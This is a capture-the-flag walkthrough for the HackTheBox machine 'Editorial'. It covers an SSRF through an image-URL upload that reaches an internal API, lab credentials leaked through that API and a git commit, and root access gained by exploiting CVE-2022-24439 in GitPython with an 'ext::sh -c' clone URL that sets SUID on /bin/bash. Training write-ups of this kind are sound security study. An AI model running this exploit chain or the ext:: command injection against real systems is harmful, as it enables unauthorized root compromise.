---
title: Editorial HackTheBox
author: Saad
date: 2024-11-27 00:00:00 +0500
categories:
  - HackTheBox
  - Easy Box
tags:
  - ssrf
  - git
  - ctf
  - python
  - cve-2022-24439
  - gitpython
  - web app
  - api 
  - hackthebox
image: editorial.png
media_subpath: /assets/img/editorial-htb
---

## Box Info:
Editorial was an easy box which featured a book publishing website vulnerable to `SSRF`. it can be used to gain access to internal API, Access to local API can reveal `SSH` cerds to the machine. Enumerating the system further we can find a git repo, looking at the commit history we can find one commit with the password to a new user.
Root can be obtained via exploiting the RCE in `gitopython`.

## Recon

![](https://miro.medium.com/v2/resize:fit:1400/1*JvfB91othpBmIrLtv8mBbg.jpeg)

### Nmap
First off, I'll start with nmap to see what ports are open.
```console
➜  editorial nmap -sCV -oN scan.txt editorial.htb -T4 --min-rate=10000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 13:27 EST
Nmap scan report for editorial.htb (10.129.167.37)
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
```
The site redirects to `editorial.htb`, I already added to `/etc/hosts` file.
```bash
echo '10.129.167.37 editorial.htb' | sudo tee -a /etc/hosts
```
### Site 

![MONSTERS](https://mczellbookwriting.com/blog/wp-content/uploads/2022/06/book-memes-05.png)

Looking at the site I don't really find anything interesting but there is `/upload` page.
> Our editorial will be happy to publish your book. Please provide next information to meet you.


![](upload.png)

I can upload an image or give it the URL to an image. if I host an image on my webserver it will get displayed on there.

![](fetch.png)

```bash
Serving on http://0.0.0.0:80
10.129.167.37 - - [2024-11-27 13:50:05] "GET /logo.png HTTP/1.1" 200 -
```
![](https://project-static-assets.s3.amazonaws.com/APISpreadsheets/APIMemes/HTTPErrorCors.png)
The HTTP response shows the path of the image it got uploaded to:

![](response.png)

## Shell as dev
### localhost:5000 & API Enum
I tried accessing localhost but it hangs for some seconds and have the same response as site itself.
But I can make a request to local?.

After trying for sometime I got an interesting response back. 

```console
➜  editorial curl http://editorial.htb/static/uploads/b6be4416-74f2-439c-ab61-9324fdfe53e1
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```
![](https://project-static-assets.s3.amazonaws.com/APISpreadsheets/APIMemes/WeAreNotTheSame.jpeg)

I mean **Exposed Endpoints**.

I saved the response in a file, catted the file and piped into `jq` to have a more human readable look.
```bash
➜  editorial cat api| jq .
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
Making request to any of these urls returns the response as above I got, But this endpoint is very interesting `/api/latest/metadata/messages/authors`.
I requested it and got a juicy info back.

```bash
➜  editorial curl -s 'http://editorial.htb/static/uploads/b67835e4-daed-4717-a961-c0a4adb22ab3' | jq .
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

It has a username and password. `dev : dev080217_devAPI!@`
### SSH

```bash
➜  editorial ssh dev@editorial.htb
dev@editorial.htb's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
    <SNIP>
dev@editorial:~$ ls -lah
total 32K
drwxr-x--- 4 dev  dev  4.0K Jun  5 14:36 .
drwxr-xr-x 4 root root 4.0K Jun  5 14:36 ..
drwxrwxr-x 3 dev  dev  4.0K Jun  5 14:36 apps
lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 dev  dev  3.7K Jan  6  2022 .bashrc
drwx------ 2 dev  dev  4.0K Jun  5 14:36 .cache
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
-rw-r----- 1 root dev    33 Nov 27 12:51 user.txt
```
![](hackercat.png)

Looking at the box, there are only 2 users. 
```bash
dev@editorial:~/apps$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
```

## Shell as prod
### git commits

There is `apps` in dev's home directory which has a `.git` directory!
```bash
dev@editorial:~/apps$ ls -lah
total 12K
drwxrwxr-x 3 dev dev 4.0K Jun  5 14:36 .
drwxr-x--- 4 dev dev 4.0K Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4.0K Jun  5 14:36 .git
```
I looked at git logs and found an interesting commit that stood out.
```bash
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
    <SNIP>

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev

    * To use development environment.

    <SNIP>
:
```
This `b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae` commit's commit message mentions that there was downgrading made from prod to dev.
Looking at the commit, it has some juicy stuff. 

#### prod's creds 
```bash
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
<SNP>
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
        
+ 'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for :
```
Woah, there goes the prod's creds. `prod : 080217_Producti0n_2023!@`.

![](gitgud.png)

The creds works over both over `SSH` and `su`.

```console
dev@editorial:~/apps$ su prod
Password:
prod@editorial:/home/dev/apps$
```

## Shell root

### sudo
prod has some sudo power.
```bash
prod@editorial:/home/dev/apps$ sudo -l
[sudo] password for prod:
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```
![](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fc7cziks7c4dezyz8lkqs.png)

The python script is fairly simple, No rocket science. It just clones a repo from url in that `clone_changes` directory.
```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
### Git 

```
prod@editorial:/home/dev/apps$ git --version
git version 2.34.1
```
Well, The script is not running the git, it's using git pkg GitPython.[You can read more about it here](https://github.com/gitpython-developers/GitPython)!
Looking at the the installed pkg, it shows the version of git GitPython.
```
prod@editorial:/home/dev/apps$ pip list | grep -i git
gitdb                 4.0.10
GitPython             3.1.29
```
![](https://www.codeitbro.in/wp-content/uploads/2024/10/avg-Python-User-Be-Like-608x474.webp)

### Exploiting GitPython

Looking around on the internet I found this writeup from [Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).
##### GitPython RCE POC
```python
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```
![](https://i.imgflip.com/487enr.jpg)

`sys.argv[1]`'s first argument is `clone_from` which is in the script, we can run command as root like this:

```
prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
Traceback (most recent call last):
<SNIP>
Please make sure you have the correct access rights
and the repository exists.

prod@editorial:/home/dev/apps$ ls /tmp/pwned
/tmp/pwned
prod@editorial:/home/dev/apps$
```

I'll put a SetUID on `/bin/bash` to get a root shell.
```
prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'
<SNIP>
Please make sure you have the correct access rights
and the repository exists.

prod@editorial:/home/dev/apps$ /bin/bash -p
bash-5.1# wc /root/root.txt
 1  1 33 /root/root.txt
bash-5.1# python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
root@editorial:/home/dev/apps#

```
![](https://i.imgflip.com/5ovz2l.jpg)

## Poetic path

> The box was good, a puzzle profound,  
> A hidden `git` repo waiting to be found.  
> A careless commit with a password laid bare,  
> In the app directory, it lingered there.  
>
> A Python script with a vulnerable core,  
> A library weak, an exploit to explore.  
> Executed the code, the plan was set,  
> And with it, root access was met.  

![](https://schlemielintheory.com/wp-content/uploads/2016/08/images.jpeg?w=584)